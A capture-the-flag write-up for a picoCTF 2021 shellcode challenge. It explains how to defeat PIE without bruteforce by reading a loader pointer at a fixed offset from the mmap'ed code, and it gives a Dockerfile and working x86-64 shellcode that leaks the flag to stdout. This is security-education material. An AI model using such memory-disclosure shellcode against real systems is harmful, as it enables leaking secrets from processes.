The 2 other writeups I found on this challenge ([here](https://heinen.dev/picoctf-2021-redpwn/) and [here](https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/saas/)) both mentioned a bruteforce approach to read out the flag in the binary which has PIE enabled. Since my solution does not involve bruteforcing, I thought it would be interesting to share.

It is important in my solution to have the exact same version of Ubuntu. To recreate the environment I used the Dockerfile but without the `redpwn/jail` layer, because for some reason it wasn't working. So my Dockerfile looks like:

```
FROM ubuntu@sha256:703218c0465075f4425e58fac086e09e1de5c340b12976ab9eb8ad26615c3715

COPY bin/flag.txt /root/flag.txt
COPY bin/chall /root/chall
```

When debugging the program in the container, I checked what parts of the address space where consistently at a fixed offset from the `mmap`'ed shellcode. Withing this part of the address space, I searched for a pointer that points into the binary. I found a pointer that was consistently present in different runs (inside of `ld` for what it is worth). The pointer was also always pointing at the same offset in the binary.

So my shellcode basically just reads this pointer (which is at a fixed offset from the current instruction pointer), and then calculates the `flag` address and writes a few bytes from that address to `STDOUT`.

```
BITS 64

_start:
        lea rbx, [rel _start]
        and rbx, 0xfffffffffffff000
        add rbx, 0x29f0
        mov rbx, [rbx]
        sub rbx, 0x238
        add rbx, 0x202060


        mov rax, 1
        mov rdi, 1
        mov rsi, rbx
        mov rdx, 64
        syscall
loop:
        jmp loop
```
